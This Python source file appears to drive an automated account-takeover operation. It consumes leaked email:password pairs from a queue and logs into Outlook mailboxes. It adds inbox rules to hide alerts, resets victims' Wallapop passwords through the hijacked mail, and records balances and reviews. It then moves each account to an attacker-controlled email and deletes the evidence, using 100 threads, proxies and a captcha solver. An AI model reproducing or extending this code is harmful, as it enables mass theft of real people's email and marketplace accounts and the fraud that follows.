import os
import shutil
import threading
import time
import uuid

import redis
import requests

from concurrent.futures import ThreadPoolExecutor, as_completed
from fake_useragent import UserAgent
from kafka.errors import KafkaError
from kafka import TopicPartition
from redis import ConnectionPool

from src.mail.utils.const_mail import CONFIG_FILE, RESULT_DIR, OUTPUT_DIR, OUTPUT_FILE, \
    COOKIE_DIR
from src.mail.mail import normalize_accounts, check_account
from src.mail.utils.delete_outlook_mails import extract_puid_tenatid, get_outlook_folders, \
    make_inbox_rule, empty_deleted_folder, delete_messages_by_exiting
from src.password.send_reset_mail import send_reset_email
from src.password.reset_password import reset_walla_password
from src.password.utils.proxy_cfg import build_proxy
from src.walla_login.email_change import walla_change_mail
from src.walla_login.walla_login_account import walla_login
from src.walla_login.walla_user_information import get_all_user_information
from src.walla_login.utils.kafka_consumer_cfg import create_consumer
from src.walla_login.utils.mongodb_migration import save_string_and_cookies
from src.walla_login.utils.redis_samoreg_extracting import extract_samoreg, push_samoreg_back

# sys.path.append(os.path.dirname(os.path.abspath(__file__)))

ua = UserAgent()
write_lock = threading.Lock()

MAX_WORKERS = 100
TOPIC_NAME = os.getenv('TOPIC', 'valids')

REDIS_HOST = os.getenv('REDIS_HOST')
REDIS_PORT = int(os.getenv('REDIS_PORT'))
REDIS_PASSWORD = os.getenv('REDIS_PASSWORD')
REDIS_MAX_CONNECTIONS = int(os.getenv('REDIS_MAX_CONNECTIONS'))

is_captcha_active = False
class RedisManager:
    _pool = None

    @classmethod
    def get_redis(cls):
        if cls._pool is None:
            cls._pool = ConnectionPool(
                host=REDIS_HOST,
                port=REDIS_PORT,
                password=REDIS_PASSWORD,
                max_connections=REDIS_MAX_CONNECTIONS,
                decode_responses=True,
                health_check_interval=30,
                socket_connect_timeout=5,
                socket_timeout=5
            )
        return redis.Redis(connection_pool=cls._pool)


class StopThreadException(Exception):
    pass


def save_success_result(line: str):
    """
    Потокобезопасная запись строки в файл.
    """
    with write_lock:
        with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
            f.write(line + "\n")


def save_error_result(line: str, exception_text: str):
    with write_lock:
        with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
            f.write(line + exception_text + "\n")


def process_account(email, password, config):
    try:
        email_result, password_result, session_result, token_json = check_account(email, password, config)
        canary = session_result.cookies.get('X-OWA-CANARY', 'X-OWA-CANARY_cookie_is_null_or_empty')

        puid, tenat_id = extract_puid_tenatid(token_json['id_token'])
        inbox_folderid, deleted_folderid = get_outlook_folders(session_result, token_json['access_token'], puid)

        rule_id, formatted_rule_id = make_inbox_rule(session_result, token_json['access_token'], deleted_folderid,
                                                     inbox_folderid, puid)

        # mail_token = get_last_email_token(session_result,canary,token_json['access_token'],config)
        # print('1')
        # delete_message_by_token(session_result,token_json['access_token'],inbox_folderid,puid,mail_token)

        # make_inbox_rule(session_result,token_json['access_token'],deleted_folderid,inbox_folderid,puid)

        # delete_all_walla_messages(session_result,token_json['access_token'],puid)

        session_id = uuid.uuid4().hex[:8]

        proxy = build_proxy(session_id)
        wallapop_session = requests.Session()
        wallapop_session.proxies.update(proxy)

        if email_result and token_json:

            is_walla_reset_mail_sent = send_reset_email(session=wallapop_session, email=email_result)
            if is_walla_reset_mail_sent:
                canary = session_result.cookies.get('X-OWA-CANARY', 'X-OWA-CANARY_cookie_is_null_or_empty')

                new_walla_password = reset_walla_password(session=session_result,
                                                          wallapop_session=wallapop_session,
                                                          canary=canary,
                                                          token=token_json['access_token'],
                                                          raw_email=email_result,
                                                          puid=puid)
                # cookie_dict = wallapop_session.cookies.get_dict()
                # print(cookie_dict)
                walla_auth_token, walla_reset_token = walla_login(
                    session=wallapop_session,
                    email=email_result,
                    password=new_walla_password,
                    mail_session=session_result,
                    canary=canary,
                    token=token_json['access_token'],
                    queries=config,
                    deleted_folderid=deleted_folderid,
                    puid=puid
                )

                if walla_auth_token:
                    reg_date, balance, reviews = get_all_user_information(session=wallapop_session,
                                                                          auth_token=walla_auth_token)
                    empty_deleted_folder(session_result, token_json['access_token'], deleted_folderid, puid)

                    samoreg_email, samoreg_password = extract_samoreg()

                    new_mail, new_pass = walla_change_mail(session=session_result,
                                                           wallapop_session=wallapop_session,
                                                           auth_token=walla_auth_token,
                                                           new_email=samoreg_email,
                                                           password=samoreg_password,
                                                           queries=config,
                                                           canary=canary,
                                                           token_json=token_json['access_token'],
                                                           puid=puid)
                    if new_mail and new_pass:
                        os.makedirs(OUTPUT_DIR, exist_ok=True)
                        if balance == "0.0 EUR":
                            res_line = f'{new_mail}:{new_pass}:{new_walla_password} | {reg_date} | {reviews} | {email_result}:{password_result}'
                        else:
                            res_line = f'{new_mail}:{new_pass}:{new_walla_password} | {reg_date} | {reviews} | {balance} | {email_result}:{password_result}'
                        print(res_line)
                        save_string_and_cookies(accessToken=walla_auth_token, resetToken=walla_reset_token,
                                                samoreg=res_line)
                        print("строка с саморегом очищена")

                        delete_messages_by_exiting(session_result, token_json['access_token'],
                                                   inbox_folderid, deleted_folderid, rule_id, formatted_rule_id, puid)
                        print("сообщения удалены по выходу")

                    else:
                        push_samoreg_back(samoreg_email, samoreg_password)
    except Exception as e:
        print(f"Ошибка при обработке аккаунта {email}: {e}")
        # надо реализовать сохранение в файл с ошибками

def set_flag_in_redis(value: bool):
    redis_client = RedisManager.get_redis()
    redis_client.set("cap_solver_begin_flag", str(value))
def is_executor_active(futures):
    return any(not future.done() for future in futures)

def worker(args):
    email, password, config = args
    try:
        process_account(email=email, password=password, config=config)
    except TimeoutError:
        print(f"[TIMEOUT] {email} — exceeded time limit")
    except Exception as e:
        print(f"[ERROR] {email} — {e}")


def main():
    global is_captcha_active
    # Очистка логов
    # path_log1 = "logs/mail_logs"
    # items = os.listdir(path_log1)
    # directories = [item for item in items if os.path.isdir(os.path.join(path_log1, item))]
    # directories.sort()
    # if len(directories) > 10:
    #     directories_to_delete = directories[:len(directories) - 10]
    #     for directory in directories_to_delete:
    #         try:
    #             dir_path = os.path.join(path_log1, directory)
    #             shutil.rmtree(dir_path)
    #         except OSError as e:
    #             print(f"Не удалось удалить директорию {directory}: {e}")
    #
    # path_log2 = 'logs/program_running_logging'
    # files = [f for f in os.listdir(path_log2) if os.path.isfile(os.path.join(clear
    # path_log2, f)) and f.endswith('.log')]
    # files.sort()
    # if len(files) > 10:
    #     files_to_delete = files[:len(files) - 10]
    #     for file in files_to_delete:
    #         try:
    #             os.remove(os.path.join(path_log2, file))
    #         except PermissionError:
    #             print(f"Не удалось удалить файл {file}, так как он занят другим процессом.")

    # Обработка config.txt
    config = []
    try:
        with open(f'{CONFIG_FILE}', 'r') as f:
            config = f.readlines()
        if not config:
            raise Exception("Файл config.txt пуст")
    except Exception as e:
        print(f'config upload error or empty: {e}')
        return

    consumer = None

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        while True:
            try:
                if consumer is None:
                    consumer = create_consumer()
                    print(f"Консьюмер запущен и слушает топик: valids")

                message_pack = consumer.poll(timeout_ms=1000)

                if message_pack:
                    for topic_partition, messages in message_pack.items():
                        for message in messages:
                            print(message)
                            line = message.value.strip()
                            consumer.commit()

                            if not is_captcha_active:
                                requests.post("http://web_server:5000/start-cpatch")
                                is_captcha_active = True
                                print("CAPTCHA активирована")

                            print(f"Получено сообщение: {line}")

                            normalized_accounts = normalize_accounts([line])
                            if not normalized_accounts:
                                print(f"Неверный формат сообщения: {line}")
                                continue

                            email, password = normalized_accounts[0]
                            future = executor.submit(worker, (email, password, config))
                            futures.append(future)

                else:
                    # Проверяем, завершились ли все задачи
                    if len(futures) > 0 and all(future.done() for future in futures):
                        if is_captcha_active:
                            # Ждем 40 секунд и отправляем запрос на остановку
                            time.sleep(40)
                            try:
                                requests.post("http://web_server:5000/stop-cpatch")
                                is_captcha_active = False
                                print("CAPTCHA деактивирована, все задачи завершены")
                            except Exception as e:
                                print(f"Ошибка при отправке stop-cpatch: {e}")

                        # Очищаем список futures после обработки
                        futures = []

                    time.sleep(1)

                # Периодическая очистка завершённых futures
                futures = [f for f in futures if not f.done()]

            except KafkaError as ke:
                print(f"Kafka ошибка: {ke}. Реконнект...")
                if consumer:
                    consumer.close()
                consumer = None
                time.sleep(5)
            except Exception as e:
                print(f"Неожиданная ошибка: {e}")
                time.sleep(5)

    os.makedirs(RESULT_DIR, exist_ok=True)
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    os.makedirs(COOKIE_DIR, exist_ok=True)


if __name__ == '__main__':
    print("[*] Запуск программы...")
    time_s = time.time()

    main()

    time_e = time.time()
    print(f"[*] Working time: {time_e - time_s:.2f} сек")
    print("[*] Все этапы завершены.")
